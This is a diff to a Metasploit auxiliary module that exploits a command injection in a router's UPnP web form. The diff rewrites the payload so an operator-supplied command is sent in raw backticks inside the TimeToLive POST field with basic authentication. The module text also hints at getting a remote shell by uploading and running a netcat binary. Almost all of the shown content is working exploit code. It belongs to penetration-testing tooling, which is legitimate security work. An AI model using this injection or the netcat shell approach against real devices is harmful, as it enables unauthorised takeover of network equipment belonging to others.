@@ -24,7 +24,6 @@ class Metasploit3 < Msf::Auxiliary
 				first test.
 
 				Hint: To get a remote shell you could upload a netcat binary and exec it.
-				Have phun
 			},
 			'Author'          => [ 'm-1-k-3' ],
 			'License'         => MSF_LICENSE,
@@ -36,7 +35,6 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'EDB', '24464' ],
 					[ 'OSVDB', '89985' ]
 				],
-			'DefaultTarget'  => 0,
 			'DisclosureDate' => 'Feb 06 2013'))
 
 		register_options(
@@ -77,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		vprint_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
 
-		cmd = Rex::Text.uri_encode(datastore['CMD'])
+		cmd = datastore['CMD']
 
 		#original request:
 		#data_cmd = "UPnP=UPnP&AdverTime=30&TimeToLive=%60#{cmd}%60&save=+Anwenden&todo=save&
@@ -91,12 +89,10 @@ class Metasploit3 < Msf::Auxiliary
 					'uri'	=> uri,
 					'method' => 'POST',
 					'authorization' => basic_auth(user,pass),
-					#'data' => data_cmd
-					'encode_params' => false,
 					'vars_post' => {
 						"UPnP" => "UPnP",
 						"AdverTime" => "30",
-						"TimeToLive" => "%60#{cmd}%60",
+						"TimeToLive" => "`#{cmd}`",
 						"save" => "+Anwenden",
 						"todo" => "save",
 						"this_file" => "upnp.htm",
